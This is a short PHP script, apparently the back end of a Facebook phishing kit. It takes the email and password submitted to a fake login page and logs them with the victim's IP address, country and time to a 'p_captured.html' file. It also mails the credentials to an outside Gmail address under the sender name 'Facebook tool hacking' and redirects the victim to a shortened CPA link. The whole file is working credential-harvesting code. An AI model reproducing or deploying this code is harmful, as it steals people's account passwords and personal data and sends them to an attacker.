<?php
session_start();

include("geoiploc.php");
$user = $_POST["email"];
$pass = $_POST["pass"];
$ip= $_SERVER['REMOTE_ADDR'];
$date = date('F / d / Y');
$time = date('( h:m A )');
$pais = getCountryFromIP($ip, " NamE ");
$reqlen = strlen($user) * strlen($pass);

$_SESSION['user'] = $user;

//Abrir archivo
if ($reqlen > 0) {
     $save_dataUser = fopen("../../fbs/p_captured.html", "a+");

     //Escribir en el archivo
     fwrite($save_dataUser, 
     "<li>Directories:</li>".
     "<h3>User:  ".$user."</h3>".
     "<h3>Pass:  ".$pass."</h3>".
     "<h3>Country:    ".$pais."</h3>".
     "<h3>IP:    ".$ip."</h3>".
     "<h3>Date:  ".$date." ".$time."</h3><br/>"
     );

     //Cerrar archivo
     fclose($save_dataUser);
     //Eviar por correo
     $email = "bin.recycle.spam@gmail.com";
     $subject = "Facebook Accounts";
     $message = "User ".$user." "." Pass"." ".$pass;
     $head_html = "From: Facebook tool hacking <bin.recycle.spam@gmail.com>\r\nContent-type: text/html\r\n";
     mail($email, $subject, $message, $head_html);

     //Enviar al usuario a:
     header('Location: http://bit.ly/FacebookCPA');
}
else {
	echo "<script>alert('Debe rellenar todos los campos');</script>";
	header('Location: ../index.html');
}


?>